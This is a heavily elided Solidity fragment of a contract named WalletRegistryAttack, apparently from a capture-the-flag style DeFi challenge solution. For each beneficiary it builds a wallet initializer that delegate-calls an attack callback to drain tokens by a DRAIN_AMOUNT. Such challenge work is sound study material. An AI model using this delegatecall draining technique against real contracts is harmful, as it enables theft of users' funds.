...
contract WalletRegistryAttack {
    ...
    constructor(address[] memory _initialBeneficiaries, address _walletRegistry) {
        ...
        for (uint8 i = 0; i < _initialBeneficiaries.length;) {
            ...
            bytes memory initializer = abi.encodeWithSelector(
                ...
                abi.encodeWithSelector(
                    DelegateCallbackAttack.delegateCallback.selector, address(token), address(this), DRAIN_AMOUNT
                ),
